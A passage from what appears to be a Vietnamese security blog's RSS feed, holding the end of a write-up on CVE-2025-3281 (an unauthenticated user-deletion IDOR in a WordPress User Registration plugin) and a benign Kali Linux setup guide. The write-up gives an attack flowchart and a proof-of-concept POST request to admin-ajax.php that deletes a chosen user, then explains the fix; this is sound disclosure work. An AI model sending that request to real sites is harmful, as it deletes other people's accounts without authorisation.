bất kỳ user nào&lt;/strong&gt; được tạo qua plugin, ngay cả khi attacker không đăng nhập.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Unauthenticated)&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Send POST request to admin-ajax.php?action=user_registration_membership_create_stripe_subscription&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;WordPress routes request via wp_ajax_nopriv_*&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;create_stripe_subscription() executed&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Read POST parameters (member_id, customer_id, payment_method_id)&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Check get_user_meta(member_id, &amp;#39;urm_user_just_created&amp;#39;)&amp;#34;]&#xA;&#xA;F --&amp;gt;|Not exists| G[&amp;#34;Request rejected&amp;#34;]&#xA;F --&amp;gt;|Exists| H[&amp;#34;Call create_subscription()&amp;#34;]&#xA;&#xA;H --&amp;gt; I{&amp;#34;Stripe subscription valid?&amp;#34;}&#xA;&#xA;I --&amp;gt;|Yes| J[&amp;#34;Return success response&amp;#34;]&#xA;I --&amp;gt;|No| K[&amp;#34;wp_delete_user(member_id)&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Target user deleted&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Truy cập &lt;code&gt;/membership-registration/?&lt;/code&gt; và lấy giá trị của &lt;code&gt;_confirm_payment_nonce&lt;/code&gt; từ response&lt;/li&gt;&#xA;&lt;li&gt;Gửi request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: wordpress_test_cookie=WP%20Cookie%20check; isSidebarEnabled=true; __stripe_mid=f13365af-449c-4412-b77c-7213da0dbe814d9925; __stripe_sid=7323a342-4cac-4124-9d98-a02abd109a8cd8d073; wp_lang=en_US&#xA;&#xA;action=user_registration_membership_create_stripe_subscription&amp;amp;_ajax_nonce=472f729de7&amp;amp;member_id=member_id_to_delete&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-3281&lt;/strong&gt; xuất phát từ việc hàm &lt;code&gt;create_stripe_subscription()&lt;/code&gt; cho phép truy cập không xác thực trong khi lại xử lý trực tiếp dữ liệu nhạy cảm do người dùng kiểm soát. Việc thiếu kiểm tra quyền đối với &lt;code&gt;member_id&lt;/code&gt;, kết hợp với việc endpoint được expose qua &lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt;, đã tạo điều kiện để attacker xóa tài khoản người dùng một cách trái phép.&#xA;Bản vá ở phiên bản 4.2.2 đã khắc phục vấn đề bằng cách bổ sung kiểm tra quyền (&lt;code&gt;current_user_can&lt;/code&gt;), ngăn chặn hoàn toàn hành vi IDOR.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nonce không thay thế cho kiểm tra quyền truy cập.&lt;/li&gt;&#xA;&lt;li&gt;Các endpoint &lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; cần được kiểm soát chặt chẽ.&lt;/li&gt;&#xA;&lt;li&gt;Không nên thực hiện hành động nhạy cảm (xóa user, thay đổi trạng thái) chỉ dựa trên dữ liệu từ client.&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra quyền (&lt;code&gt;current_user_can&lt;/code&gt;) là bắt buộc khi thao tác với tài nguyên người dùng.&lt;/li&gt;&#xA;&lt;li&gt;IDOR thường xuất hiện khi business logic thiếu ràng buộc về quyền, không chỉ do lỗi kỹ thuật đơn thuần.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/user-registration/vulnerability/wordpress-user-registration-membership-plugin-4-2-1-insecure-direct-object-reference-to-unauthenticated-limited-user-deletion-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress User Registration Plugin &amp;lt;= 4.2.1 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Setup Kali Linux For Pentest</title>
      <link>http://localhost:1313/vi/posts/2025-12-25-setup-kali-for-pentest/</link>
      <pubDate>Thu, 25 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-25-setup-kali-for-pentest/</guid>
      <category domain="http://localhost:1313/vi/categories/pentest/">Pentest</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-25-setup-kali-for-pentest/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;update--upgrade&#34;&gt;&lt;span&gt;Update &amp;amp; Upgrade&lt;/span&gt;&#xA;  &lt;a href=&#34;#update--upgrade&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt update -y &amp;amp;&amp;amp; sudo apt update -y &amp;amp;&amp;amp; sudo apt full-upgrade -y&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;download-fcitx5-unikey&#34;&gt;&lt;span&gt;Download Fcitx5 Unikey&lt;/span&gt;&#xA;  &lt;a href=&#34;#download-fcitx5-unikey&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install fcitx5 fcitx5-unikey fcitx5-config-qt fcitx5-frontend-gtk3 fcitx5-frontend-gtk2 -y&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Config&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;fcitx5-configtool&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;download-vscode&#34;&gt;&lt;span&gt;Download VSCode&lt;/span&gt;&#xA;  &lt;a href=&#34;#download-vscode&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Download từ &lt;a href=&#34;https://code.visualstudio.com/download&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://code.visualstudio.com/download&lt;/a&gt; hoặc sử dụng terminal:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wget -O vscode.deb &amp;#34;https://code.visualstudio.com/sha/download?build=stable&amp;amp;os=linux-deb-x64&#xA;sudo apt install ./vscode.deb&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;download-hugo-for-blog&#34;&gt;&lt;span&gt;Download Hugo for Blog&lt;/span&gt;&#xA;  &lt;a href=&#34;#download-hugo-for-blog&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Tải về&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;wget https://github.com/gohugoio/hugo/releases/download/v0.153.0/hugo_extended_0.153.0_linux-amd64.tar.gz&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Giải nén và cài&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;tar -xvzf hugo_extended_*_linux-amd64.tar.gz&#xA;sudo mv hugo /usr/local/bin/&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;remove-underline-in-zsh&#34;&gt;&lt;span&gt;Remove Underline in Zsh&lt;/span&gt;&#xA;  &lt;a href=&#34;#remove-underline-in-zsh&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;(( ${&amp;#43;ZSH_HIGHLIGHT_STYLES} )) || typeset -A ZSH_HIGHLIGHT_STYLES&#xA;ZSH_HIGHLIGHT_STYLES[path]=none&#xA;ZSH_HIGHLIGHT_STYLES[path_prefix]=none&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Thay đổi tất cả từ &lt;code&gt;underline&lt;/code&gt; thành &lt;code&gt;none&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;-ZSH_HIGHLIGHT_STYLES[unknown-token]=underline&#xA;&amp;#43;ZSH_HIGHLIGHT_STYLES[unknown-token]=none&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;eza-for-ls-ouput&#34;&gt;&lt;span&gt;&lt;code&gt;eza&lt;/code&gt; for &lt;code&gt;ls&lt;/code&gt; ouput&lt;/span&gt;&#xA;  &lt;a href=&#34;#eza-for-ls-ouput&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Tải&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install eza&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Cấu hình&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;alias ls=&amp;#39;eza --group-directories-first&amp;#39;&#xA;alias ll=&amp;#39;eza -lah --group-directories-first&amp;#39;&#xA;alias la=&amp;#39;eza -a --group-directories-first&amp;#39;&#xA;alias lt=&amp;#39;eza --tree --group-directories-first&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;grc-for-color-output&#34;&gt;&lt;span&gt;&lt;code&gt;grc&lt;/code&gt; for Color Output&lt;/span&gt;&#xA;  &lt;a href=&#34;#grc-for-color-output&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Tải&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install grc -y&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Cấu hình&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;# Auto alias commands supported by grc (except ls)&#xA;if command -v grc &amp;gt;/dev/null; then&#xA;  for f in /usr/share/grc/conf.*; do&#xA;    cmd=&amp;#34;${f##*/conf.}&amp;#34;  &#xA;    [ &amp;#34;$cmd&amp;#34; = &amp;#34;ls&amp;#34; ] &amp;amp;&amp;amp; continue&#xA;    alias &amp;#34;$cmd=grc $cmd&amp;#34;&#xA;  done&#xA;fi&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;fzf--fuzzy-finder&#34;&gt;&lt;span&gt;&lt;code&gt;fzf&lt;/code&gt; – fuzzy finder&lt;/span&gt;&#xA;  &lt;a href=&#34;#fzf--fuzzy-finder&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install fzf&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;bat-for-read-file&#34;&gt;&lt;span&gt;&lt;code&gt;bat&lt;/code&gt; for Read File&lt;/span&gt;&#xA;  &lt;a href=&#34;#bat-for-read-file&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 